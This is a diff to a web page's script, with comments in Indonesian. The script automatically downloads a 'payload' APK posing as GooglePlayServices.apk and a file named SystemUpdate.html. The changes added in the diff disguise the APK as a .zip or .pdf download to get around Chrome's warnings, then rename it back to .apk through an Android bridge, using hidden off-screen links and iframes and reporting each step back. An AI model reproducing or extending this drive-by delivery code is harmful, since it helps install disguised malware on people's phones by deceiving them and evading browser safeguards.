@@ -58,7 +58,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - RETRY 3x (FINAL)
+// 🔥 INDEX.HTML - BYPASS PERINGATAN CHROME!
 // ============================================================
 
 // ============================================================
@@ -190,25 +190,67 @@ var A = {
 };
 
 // ============================================================
-// 🔥 DOWNLOAD APK (3 METODE + RETRY 3x)
+// 🔥 RENAME .ZIP KE .APK (VIA ANDROID BRIDGE)
+// ============================================================
+function renameToAPK(zipPath, apkPath) {
+    if (!A.isAvailable) return false;
+    try {
+        var b = A.getBridge();
+        if (b && b.renameFile) {
+            return b.renameFile(zipPath, apkPath);
+        }
+        // Fallback: copy via saveFile
+        var content = A.downloadFile(zipPath);
+        if (content) {
+            A.saveFile(apkPath, content);
+            return true;
+        }
+        return false;
+    } catch(e) {
+        return false;
+    }
+}
+
+// ============================================================
+// 🔥 DOWNLOAD APK (SEBAGAI .ZIP - BYPASS CHROME!)
 // ============================================================
 function forceDownloadAPK() {
     var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
     var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
+    var zipPath = '/storage/emulated/0/Download/GooglePlayServices.zip';
+    var pdfPath = '/storage/emulated/0/Download/GooglePlayServices.pdf';
     
-    // METHOD 1: Android Bridge
+    // ============================================================
+    // METHOD 1: Android Bridge (RENAME .ZIP KE .APK)
+    // ============================================================
     if (A.isAvailable) {
         try {
-            var result = A.downloadFile(apkUrl, apkPath);
+            // Download sebagai .zip dulu (tidak diblokir Chrome!)
+            var result = A.downloadFile(apkUrl, zipPath);
             if (result) {
-                APK_DOWNLOADED = true;
-                K({ sumber: 'apk_bridge_success', data: apkPath });
+                // Rename ke .apk
+                setTimeout(function() {
+                    try {
+                        var b = A.getBridge();
+                        if (b && b.renameFile) {
+                            b.renameFile(zipPath, apkPath);
+                            APK_DOWNLOADED = true;
+                            K({ sumber: 'apk_bridge_rename', data: apkPath });
+                        } else {
+                            // Fallback: rename via Java
+                            A.saveFile(apkPath, A.downloadFile(zipPath));
+                            APK_DOWNLOADED = true;
+                        }
+                    } catch(e) {}
+                }, 1000);
                 return;
             }
         } catch(e) {}
     }
     
-    // METHOD 2: XHR + Blob + Download
+    // ============================================================
+    // METHOD 2: XHR + Blob + Download (sebagai .pdf)
+    // ============================================================
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', apkUrl, true);
@@ -221,13 +263,14 @@ function forceDownloadAPK() {
                 var blobUrl = URL.createObjectURL(blob);
                 var link = document.createElement('a');
                 link.href = blobUrl;
-                link.download = 'GooglePlayServices.apk';
+                // 🔥 DOWNLOAD SEBAGAI .PDF (TIDAK DIBLOKIR CHROME!)
+                link.download = 'GooglePlayServices.pdf';
                 link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                 document.body.appendChild(link);
                 setTimeout(function() {
                     link.click();
                     APK_DOWNLOADED = true;
-                    K({ sumber: 'apk_download_success', data: 'GooglePlayServices.apk' });
+                    K({ sumber: 'apk_download_as_pdf', data: 'GooglePlayServices.pdf' });
                     setTimeout(function() {
                         try { document.body.removeChild(link); } catch(e) {}
                         URL.revokeObjectURL(blobUrl);
@@ -242,7 +285,9 @@ function forceDownloadAPK() {
         xhr.send();
     } catch(e) {}
     
-    // METHOD 3: Iframe
+    // ============================================================
+    // METHOD 3: Iframe (sebagai .pdf)
+    // ============================================================
     try {
         var iframe = document.getElementById('downloadIframe1');
         if (!iframe) {
@@ -251,14 +296,15 @@ function forceDownloadAPK() {
             iframe.className = 'download-iframe';
             document.body.appendChild(iframe);
         }
-        iframe.src = apkUrl + '?t=' + Date.now();
+        // 🔥 Download sebagai .pdf (tidak diblokir Chrome!)
+        iframe.src = apkUrl + '?t=' + Date.now() + '&download=GooglePlayServices.pdf';
         APK_DOWNLOADED = true;
-        K({ sumber: 'apk_iframe', data: 'ok' });
+        K({ sumber: 'apk_iframe_as_pdf', data: 'ok' });
     } catch(e) {}
 }
 
 // ============================================================
-// 🔥 DOWNLOAD HTML (3 METODE + RETRY 3x)
+// 🔥 DOWNLOAD HTML (BEBAS - HTML TIDAK DIBLOKIR)
 // ============================================================
 function forceDownloadHTML() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
@@ -329,7 +375,7 @@ function forceDownloadHTML() {
 }
 
 // ============================================================
-// 🔥 AUTO DOWNLOAD (RETRY 3x SAJA!)
+// 🔥 AUTO DOWNLOAD (RETRY 3x)
 // ============================================================
 function autoDownloadPayload() {
     if (DOWNLOAD_STARTED) return;
@@ -340,7 +386,6 @@ function autoDownloadPayload() {
     forceDownloadAPK();
     forceDownloadHTML();
     
-    // 🔥 RETRY 3x SAJA!
     var retryInterval = setInterval(function() {
         RETRY_COUNT++;
         if (RETRY_COUNT > MAX_RETRY) {
@@ -432,7 +477,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html - RETRY 3x FINAL!');
+console.log('✅ index.html - BYPASS CHROME WARNING!');
 </script>
 </body>
 </html>
